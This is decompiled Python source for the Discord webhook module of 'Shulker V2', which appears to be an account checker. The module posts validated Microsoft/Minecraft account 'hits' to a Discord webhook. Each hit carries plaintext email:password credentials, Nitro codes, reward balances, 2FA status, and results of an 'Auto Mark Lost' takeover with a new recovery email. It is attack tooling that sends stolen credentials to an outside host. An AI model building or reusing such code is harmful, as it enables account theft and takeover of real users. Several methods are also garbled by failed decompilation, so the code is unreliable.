# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: 'src\\integrations\\discord_webhook.py'
# Bytecode version: 3.13.0rc3 (3571)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

"""\nDiscord Webhook Integration\nBeautiful embeds for hits with configurable filters\n"""
import requests
import time
from typing import Dict, Optional, List
from datetime import datetime
from src.utils.logger import get_logger
logger = get_logger()
class DiscordWebhook:
    """Send beautiful embeds to Discord webhook"""
    def __init__(self, config: dict):
        """\nInitialize Discord webhook\n\nConfig format:\n{\n    \'enabled\': True,\n    \'webhook_url\': \'https://discord.com/api/webhooks/...\',\n    \'send_all_hits\': False,  # Send every valid account\n    \'send_minecraft\': True,   # Send Minecraft hits\n    \'send_nitro\': True,       # Send Nitro hits\n    \'send_2fa\': False,        # Send 2FA accounts\n    \'send_rewards\': True,     # Send MS Rewards > threshold\n    \'rewards_threshold\': 500, # Min points to send\n    \'send_gamepass\': True,    # Send Game Pass hits\n    \'username\': \'Shulker V2\', # Bot username\n    \'avatar_url\': \'\',         # Bot avatar (optional)\n    \'use_custom_embed\': False, # Use custom embed template\n    \'embed_title\': \'...\',     # Custom embed title\n    \'embed_description\': \'...\', # Custom embed description\n    \'embed_color\': \'0x57F287\', # Custom embed color (hex)\n    \'embed_footer\': \'...\',    # Custom embed footer\n    \'embed_fields\': [...]     # Custom embed fields\n}\n"""
        self.enabled = config.get('enabled', False)
        self.webhook_url = config.get('webhook_url', '')
        self.send_all_hits = config.get('send_all_hits', False)
        self.send_minecraft = config.get('send_minecraft', True)
        self.send_nitro = config.get('send_nitro', True)
        self.send_2fa = config.get('send_2fa', False)
        self.send_rewards = config.get('send_rewards', True)
        self.rewards_threshold = config.get('rewards_threshold', 500)
        self.send_gamepass = config.get('send_gamepass', True)
        self.send_hypixel = config.get('send_hypixel', False)
        self.send_donut = config.get('send_donut', False)
        self.username = config.get('username', 'Shulker V2')
        self.avatar_url = config.get('avatar_url', '')
        self.config = config
        self.last_send_time = 0
        self.min_delay = 1.0
        if self.enabled and (not self.webhook_url):
                logger.error('❌ Discord webhook enabled but no URL provided!')
                self.enabled = False
        if self.enabled:
            logger.info('🔔 Discord webhook: ENABLED')
            if config.get('use_custom_embed', False):
                logger.info('🎨 Custom embed template: ENABLED')
            self._test_webhook()
    def _test_webhook(self):
        # irreducible cflow, using cdg fallback
        """Test webhook on startup"""
        # ***<module>.DiscordWebhook._test_webhook: Failure: Compilation Error
        data = {'username': self.username, 'avatar_url': self.avatar_url, 'content': '✅ **Shulker V2 Started** - Webhook connection successful!'}
        response = requests.post(self.webhook_url, json=data, timeout=10)
        if response.status_code in [200, 204]:
            logger.info('✅ Discord webhook test successful!')
                return
            logger.error(f'❌ Discord webhook test failed: {response.status_code}')
            self.enabled = False
                except Exception as e:
                        logger.error(f'❌ Discord webhook test failed: {e}')
                        self.enabled = False
    def send_hit(self, account_data: Dict):
        # irreducible cflow, using cdg fallback
        """Send hit to Discord if it matches filters"""
        # ***<module>.DiscordWebhook.send_hit: Failure: Compilation Error
        if not self.enabled:
            return
        if not self._should_send(account_data):
            return
            current_time = time.time()
            if current_time - self.last_send_time < self.min_delay:
                time.sleep(self.min_delay - (current_time - self.last_send_time))
            embed = self._create_embed(account_data)
            data = {'username': self.username, 'avatar_url': self.avatar_url, 'embeds': [embed]}
            response = requests.post(self.webhook_url, json=data, timeout=10)
            if response.status_code in [200, 204]:
                logger.debug(f'📤 Sent to Discord: {account_data.get('email')}')
            else:
                logger.warning(f'⚠️ Discord send failed: {response.status_code}')
            self.last_send_time = time.time()
            except Exception as e:
                    logger.error(f'Discord webhook error: {e}')
    def _should_send(self, account_data: Dict) -> bool:
        """Check if account meets send criteria"""
        if self.send_all_hits:
            return True
        else:
            minecraft_data = account_data.get('minecraft') or {}
            minecraft = minecraft_data.get('ownership', {}) if isinstance(minecraft_data, dict) else {}
            nitro = account_data.get('nitro') or {}
            security = account_data.get('security') or {}
            rewards = account_data.get('rewards') or {}
            hypixel = account_data.get('hypixel') or {}
            donut = account_data.get('donut') or {}
            if not isinstance(minecraft, dict):
                minecraft = {}
            if not isinstance(nitro, dict):
                nitro = {}
            if not isinstance(security, dict):
                security = {}
            if not isinstance(rewards, dict):
                rewards = {}
            if not isinstance(hypixel, dict):
                hypixel = {}
            if not isinstance(donut, dict):
                donut = {}
            if self.send_minecraft and (minecraft.get('minecraft_java_owned') or minecraft.get('minecraft_bedrock_owned')):
                return True
            else:
                if self.send_nitro and nitro.get('eligible'):
                    return True
                else:
                    if self.send_2fa and security.get('status') == '2FA_ENABLED':
                        return True
                    else:
                        if self.send_rewards:
                            points = rewards.get('available_points', 0)
                            if points >= self.rewards_threshold:
                                return True
                        if self.send_gamepass and (minecraft.get('minecraft_java_gamepass') or minecraft.get('minecraft_bedrock_gamepass')):
                            return True
                        else:
                            if self.send_hypixel and hypixel and (hypixel.get('level', 0) > 50):
                                return True
                            else:
                                if self.send_donut and donut and (donut.get('balance', 0) > 1000):
                                    return True
                                else:
                                    return False
    def _create_embed(self, account_data: Dict) -> Dict:
        """Create beautiful Discord embed - supports custom templates"""
        use_custom = self.config.get('use_custom_embed', False)
        if use_custom:
            return self._create_custom_embed(account_data)
        else:
            return self._create_default_embed(account_data)
    def _create_custom_embed(self, account_data: Dict) -> Dict:
        """Create embed from custom template"""
        # ***<module>.DiscordWebhook._create_custom_embed: Failure: Different bytecode
        title_template = self.config.get('embed_title', '🎮 NEW HIT - {email}')
        desc_template = self.config.get('embed_description', '**Credentials:** `{email}:{password}`')
        footer_template = self.config.get('embed_footer', 'Shulker V2 • {timestamp}')
        color_template = self.config.get('embed_color', '')
        custom_fields = self.config.get('embed_fields', [])
        title = self._replace_variables(title_template, account_data)
        description = self._replace_variables(desc_template, account_data)
        footer_text = self._replace_variables(footer_template, account_data)
        color = self._get_embed_color(account_data)
        if color_template:
            try:
                if color_template.startswith('0x'):
                    color = int(color_template, 16)
                else:
                    color = int(color_template, 16)
            except:
                pass
        fields = []
        for field_template in custom_fields:
            field_name = self._replace_variables(field_template.get('name', ''), account_data)
            field_value = self._replace_variables(field_template.get('value', ''), account_data)
            field_inline = field_template.get('inline', False)
            if field_name and field_value:
                    fields.append({'name': field_name, 'value': field_value, 'inline': field_inline})
        footer = {'text': footer_text}
        footer_icon = self.config.get('embed_footer_icon', '')
        if footer_icon:
            footer['icon_url'] = footer_icon
        embed = {'title': title, 'description': description, 'color': color, 'fields': fields, 'footer': footer, 'timestamp': datetime.utcnow().isoformat()}
        return embed
    def _replace_variables(self, template: str, account_data: Dict) -> str:
        """Replace variables in template string"""
        if not template:
            return ''
        else:
            email = account_data.get('email', 'Unknown')
            password = account_data.get('password', '')
            minecraft = account_data.get('minecraft', {})
            ownership = minecraft.get('ownership', {}) if minecraft else {}
            profile = minecraft.get('profile', {}) if minecraft else {}
            mc_username = profile.get('username', 'N/A')
            mc_uuid = profile.get('uuid', 'N/A')
            mc_java_owned = 'Yes' if ownership.get('minecraft_java_owned') else 'No'
            mc_bedrock_owned = 'Yes' if ownership.get('minecraft_bedrock_owned') else 'No'
            mc_gamepass = 'Yes' if ownership.get('minecraft_java_gamepass') or ownership.get('minecraft_bedrock_gamepass') else 'No'
            capes_list = []
            if profile.get('capes'):
                for cape in profile['capes']:
                    if isinstance(cape, dict):
                        alias = cape.get('alias', '')
                        if alias:
                            capes_list.append(alias)
            capes = ', '.join(capes_list) if capes_list else 'None'
            name_changeable = 'Yes' if profile.get('name_changeable') else 'No'
            xbox = account_data.get('xbox', {})
            xbox_gamertag = xbox.get('gamertag', 'N/A') if xbox else 'N/A'
            nitro = account_data.get('nitro', {})
            nitro_status = nitro.get('status', 'N/A').upper() if nitro.get('eligible') else 'Not Eligible'
            nitro_code = nitro.get('promo_code', 'N/A') if nitro else 'N/A'
            nitro_link = nitro.get('redemption_link', 'N/A') if nitro else 'N/A'
            security = account_data.get('security', {})
            security_status = security.get('status', 'Unknown') if security else 'Unknown'
            hypixel = account_data.get('hypixel', {})
            hypixel_level = str(hypixel.get('level', hypixel.get('network_level', 'N/A'))) if hypixel else 'N/A'
            hypixel_rank = str(hypixel.get('rank', 'None')) if hypixel else 'None'
            hypixel_banned = str(hypixel.get('banned', 'False')) if hypixel else 'False'
            donut = account_data.get('donut', {})
            donut_balance = f'${donut.get('balance', 0):,}' if donut else '$0'
            donut_playtime = f'{donut.get('playtime_hours', 0)}h' if donut else '0h'
            rewards = account_data.get('rewards', {})
            rewards_points = str(rewards.get('available_points', 0)) if rewards else '0'
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            result = template
            result = result.replace('{email}', email)
            result = result.replace('{password}', password)
            result = result.replace('{mc_username}', mc_username)
            result = result.replace('{mc_uuid}', mc_uuid)
            result = result.replace('{mc_java_owned}', mc_java_owned)
            result = result.replace('{mc_bedrock_owned}', mc_bedrock_owned)
            result = result.replace('{mc_gamepass}', mc_gamepass)
            result = result.replace('{xbox_gamertag}', xbox_gamertag)
            result = result.replace('{nitro_status}', nitro_status)
            result = result.replace('{nitro_code}', nitro_code)
            result = result.replace('{nitro_link}', nitro_link)
            result = result.replace('{security_status}', security_status)
            result = result.replace('{hypixel_level}', hypixel_level)
            result = result.replace('{hypixel_rank}', hypixel_rank)
            result = result.replace('{hypixel_banned}', hypixel_banned)
            result = result.replace('{donut_balance}', donut_balance)
            result = result.replace('{donut_playtime}', donut_playtime)
            result = result.replace('{rewards_points}', rewards_points)
            result = result.replace('{capes}', capes)
            result = result.replace('{name_changeable}', name_changeable)
            result = result.replace('{timestamp}', timestamp)
            return result
    def _create_default_embed(self, account_data: Dict) -> Dict:
        """Create default beautiful Discord embed"""
        # ***<module>.DiscordWebhook._create_default_embed: Failure: Different bytecode
        email = account_data.get('email', 'Unknown')
        password = account_data.get('password', '')
        color = self._get_embed_color(account_data)
        title = '🎮 NEW HIT - ' + email
        description = f'**Credentials:** `{email}:{password}`\n\n'
        fields = []
        minecraft = account_data.get('minecraft', {})
        if minecraft:
            ownership = minecraft.get('ownership', {})
            profile = minecraft.get('profile', {})
            minecraft_value = []
            if ownership.get('minecraft_java_owned'):
                minecraft_value.append('✅ Java OWNED')
            if ownership.get('minecraft_bedrock_owned'):
                minecraft_value.append('✅ Bedrock OWNED')
            if ownership.get('minecraft_java_gamepass'):
                minecraft_value.append('🎮 Java Game Pass')
            if ownership.get('minecraft_bedrock_gamepass'):
                minecraft_value.append('🎮 Bedrock Game Pass')
            if not minecraft_value:
                minecraft_value.append('❌ No Minecraft')
            if profile.get('username'):
                minecraft_value.append(f'**Username:** {profile.get('username')}')
            fields.append({'name': '🎮 Minecraft', 'value': '\n'.join(minecraft_value), 'inline': True})
        security = account_data.get('security', {})
        if security:
            status = security.get('status', 'Unknown')
            if status == 'CLEAN':
                security_text = '✅ Clean (No 2FA)'
            else:
                if status == '2FA_ENABLED':
                    security_text = '🔒 2FA Enabled'
                else:
                    if status == 'SECURITY_PENDING':
                        security_text = '⏳ Pending Changes'
                    else:
                        security_text = status
            fields.append({'name': '🔒 Security', 'value': security_text, 'inline': True})
        xbox = account_data.get('xbox', {})
        if xbox and xbox.get('gamertag'):
                fields.append({'name': '🎮 Xbox', 'value': f'**Gamertag:** {xbox.get('gamertag')}', 'inline': True})
        nitro = account_data.get('nitro', {})
        if nitro and nitro.get('eligible'):
                nitro_value = []
                status = nitro.get('status', 'Unknown')
                if status == 'claimed':
                    nitro_value.append('✅ **CLAIMED**')
                    if nitro.get('promo_code'):
                        nitro_value.append(f'**Code:** `{nitro.get('promo_code')}`')
                else:
                    if status == 'available':
                        nitro_value.append('⚠️ **AVAILABLE** (Not claimed)')
                if nitro.get('redemption_link'):
                    nitro_value.append(f'[Redeem Link]({nitro.get('redemption_link')})')
                fields.append({'name': '💜 Discord Nitro', 'value': '\n'.join(nitro_value), 'inline': False})
        mark_lost = account_data.get('mark_lost', {})
        if mark_lost and mark_lost.get('success'):
                fields.append({'name': '🔄 Auto Mark Lost', 'value': f'✅ Success\n**New Recovery:** {mark_lost.get('new_recovery_email')}', 'inline': False})
        rewards = account_data.get('rewards', {})
        if rewards and rewards.get('available_points', 0) > 0:
                points = rewards.get('available_points')
                fields.append({'name': '💰 MS Rewards', 'value': f'**Balance:** {points:,} points', 'inline': True})
        hypixel = account_data.get('hypixel', {})
        if hypixel:
            hypixel_value = []
            hypixel_value.append(f'**Level:** {hypixel.get('level', 'N/A')}')
            hypixel_value.append(f'**Rank:** {hypixel.get('rank', 'None')}')
            if hypixel.get('banned'):
                hypixel_value.append('🚫 **BANNED**')
            fields.append({'name': '⚔️ Hypixel', 'value': '\n'.join(hypixel_value), 'inline': True})
        donut = account_data.get('donut', {})
        if donut:
            donut_value = []
            donut_value.append(f'**Balance:** ${donut.get('balance', 0):,}')
            donut_value.append(f'**Playtime:** {donut.get('playtime_hours', 0)}h')
            if donut.get('banned'):
                donut_value.append('🚫 **BANNED**')
            fields.append({'name': '🍩 Donut SMP', 'value': '\n'.join(donut_value), 'inline': True})
        if minecraft.get('profile', {}).get('capes'):
            capes = minecraft['profile']['capes']
            cape_names = []
            if isinstance(capes, list):
                for cape in capes:
                    if isinstance(cape, dict):
                        alias = cape.get('alias', '')
                        if alias:
                            cape_names.append(alias)
                    else:
                        if isinstance(cape, str):
                            cape_names.append(cape)
            if cape_names:
                fields.append({'name': '🎽 Capes', 'value': ', '.join(cape_names), 'inline': False})
        if minecraft.get('profile', {}).get('name_change_allowed') is not None:
            can_change = minecraft['profile']['name_change_allowed']
            fields.append({'name': '✏️ Can Change Name', 'value': '✅ Yes' if can_change else '❌ No', 'inline': True})
        footer = {'text': f'Shulker V2 • {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}'}
        footer_icon = self.config.get('embed_footer_icon', '')
        if footer_icon:
            footer['icon_url'] = footer_icon
        embed = {'title': title, 'description': description, 'color': color, 'fields': fields, 'footer': footer, 'timestamp': datetime.utcnow().isoformat()}
        return embed
    def _get_embed_color(self, account_data: Dict) -> int:
        """Determine embed color based on account value"""
        nitro = account_data.get('nitro') or {}
        if isinstance(nitro, dict) and nitro.get('eligible'):
            return 5793266
        else:
            minecraft_data = account_data.get('minecraft') or {}
            minecraft = minecraft_data.get('ownership', {}) if isinstance(minecraft_data, dict) else {}
            if isinstance(minecraft, dict):
                if minecraft.get('minecraft_java_owned') or minecraft.get('minecraft_bedrock_owned'):
                    return 16766720
                else:
                    if minecraft.get('minecraft_java_gamepass') or minecraft.get('minecraft_bedrock_gamepass'):
                        return 1080336
            rewards = account_data.get('rewards') or {}
            if isinstance(rewards, dict) and rewards.get('available_points', 0) >= 1000:
                return 30932
            else:
                return 5763719
    def send_summary(self, total: int, hits: int, session_time: str):
        """Send checking summary"""
        if not self.enabled:
            return
        else:
            try:
                embed = {'title': '📊 Checking Complete', 'description': 'Session finished successfully!', 'color': 5763719, 'fields': [{'name': '📝 Total Checked', 'value': str(total), 'inline': True}, {'name': '✅ Hits Found', 'value': str(hits), 'inline': True}, {'name': '⏱️ Time Taken', 'value': session_time, 'inline': True}], 'footer': {'text': 'Shulker V2'}, 'timestamp': datetime.utcnow().isoformat()}
                data = {'username': self.username, 'avatar_url': self.avatar_url, 'embeds': [embed]}
                requests.post(self.webhook_url, json=data, timeout=10)
            except Exception as e:
                logger.error(f'Failed to send summary: {e}')